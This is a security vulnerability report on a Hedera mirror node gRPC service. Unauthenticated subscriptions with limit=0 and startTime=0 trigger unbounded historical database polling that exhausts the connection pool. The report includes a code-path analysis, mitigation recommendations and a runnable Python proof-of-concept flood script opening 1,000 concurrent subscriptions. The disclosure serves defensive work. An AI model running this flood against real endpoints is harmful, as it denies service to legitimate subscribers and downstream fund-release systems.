### Title
Unauthenticated Subscription Flood with `limit=0` and `startTime=0` Exhausts DB Connection Pool via Unbounded Historical Queries

### Summary
Any unauthenticated external caller can open an unbounded number of gRPC subscriptions to `subscribeTopic()` with `limit=0` (no message cap) and `startTime=0` (epoch, triggering a full historical scan). Because there is no per-client or global subscription count limit, and because `limit=0` is explicitly allowed by the `@Min(0)` constraint while causing `hasLimit()` to return `false`, each subscription independently drives `PollingTopicMessageRetriever` to issue repeated full-table DB queries. Flooding the service with such subscriptions exhausts the database connection pool, causing legitimate subscribers — including applications that rely on HCS topic messages to authorize fund releases — to fail to receive messages.

### Finding Description

**Code path and root cause:**

1. `ConsensusController.subscribeTopic()` ( [1](#0-0) ) has no authentication, no per-IP rate limit, and no cap on concurrent subscriptions. It directly calls `topicMessageService.subscribeTopic(filter)` for every incoming request.

2. `TopicMessageFilter` ( [2](#0-1) ) annotates `limit` with `@Min(0)`, making `limit=0` a valid value. `hasLimit()` returns `false` when `limit == 0`, so no `flux.take()` cap is ever applied. `startTime` is also `@Min(0)`, and `isValidStartTime()` only checks `startTime <= DomainUtils.now()` — epoch 0 trivially passes.

3. `TopicMessageServiceImpl.subscribeTopic()` ( [3](#0-2) ) maintains only a `subscriberCount` gauge for metrics — it is never used as a throttle or hard limit. With `limit=0`, the `flux.take()` branch at lines 83–85 is skipped entirely.

4. `PollingTopicMessageRetriever.retrieve()` ( [4](#0-3) ) is called with `throttled=true` for the initial historical phase. In `poll()`, when `hasLimit()` is false, `limit` is set to `Integer.MAX_VALUE` ( [5](#0-4) ), and the query runs from `startTime=0` (epoch). For a high-traffic topic, this returns the maximum page size on every poll, so `isComplete()` never returns `true` for the throttled path ( [6](#0-5) ), causing perpetual polling.

5. The only per-connection concurrency control is `maxConcurrentCallsPerConnection = 5` in `NettyProperties` ( [7](#0-6) ). This limits calls *per connection*, not total connections. An attacker opens N TCP connections, each carrying 5 subscriptions, yielding 5N concurrent DB-heavy polling loops.

**Exploit flow:**

- Attacker opens 200 TCP connections to the gRPC endpoint (no auth required).
- Each connection sends 5 `subscribeTopic` requests with `topicId=<high-traffic topic>`, `limit=0`, `startTime=0` (Timestamp seconds=0, nanos=0).
- 1,000 concurrent `PollingTopicMessageRetriever` instances each issue repeated `SELECT` queries from epoch 0 against `topic_message`, each fetching `maxPageSize` rows.
- The database connection pool is saturated; legitimate subscribers time out waiting for a connection.
- Applications relying on HCS messages to authorize fund releases stop receiving messages.

### Impact Explanation

The database connection pool exhaustion is a complete denial-of-service against the mirror node's gRPC layer. Any downstream system that uses HCS topic subscriptions to trigger fund-release logic (e.g., a bridge or escrow contract listening for consensus messages) will stop receiving messages for the duration of the attack. While the freeze is not cryptographically permanent, it persists as long as the attacker maintains connections, which is trivially cheap. The severity is **High** for availability and **Critical** for any protocol that treats message delivery as a precondition for fund release.

### Likelihood Explanation

The attack requires no credentials, no special knowledge beyond a valid topic ID (which is public on-chain), and no expensive resources — only the ability to open many TCP connections. It is fully repeatable and automatable with a simple gRPC client loop. Any public mirror node endpoint is exposed.

### Recommendation

1. **Enforce a minimum `startTime`**: Reject or clamp `startTime` values older than a configurable lookback window (e.g., 24 hours) to prevent full-history scans.
2. **Treat `limit=0` as "no subscription" or require `limit >= 1`**: Change `@Min(0)` to `@Min(1)` on `TopicMessageFilter.limit`, or treat `limit=0` as an error at the controller layer.
3. **Add a global and per-IP subscription cap**: Use the existing `subscriberCount` `AtomicLong` as an enforced limit, not just a metric. Add per-source-IP tracking.
4. **Limit total concurrent connections**: Configure Netty's `maxConnections` in addition to `maxConcurrentCallsPerConnection`.
5. **Add a DB query semaphore in `PollingTopicMessageRetriever`**: Bound the total number of concurrent DB polls regardless of subscriber count.

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2

TARGET = "mirror.node.host:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1234  # known high-traffic topic
NUM_CONNECTIONS = 200
CALLS_PER_CONNECTION = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(
            shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        limit=0  # no limit → hasLimit() == false → unbounded historical scan
    )
    threads = []
    for _ in range(CALLS_PER_CONNECTION):
        def consume():
            for _ in stub.subscribeTopic(request):
                pass  # drain to keep subscription alive
        t = threading.Thread(target=consume)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

attackers = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for a in attackers:
    a.start()
# 1000 concurrent DB polling loops now active; legitimate subscribers begin timing out
```

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }

    public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
        if (!retrieverProperties.isEnabled()) {
            return Flux.empty();
        }

        PollingContext context = new PollingContext(filter, throttled);
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
    }
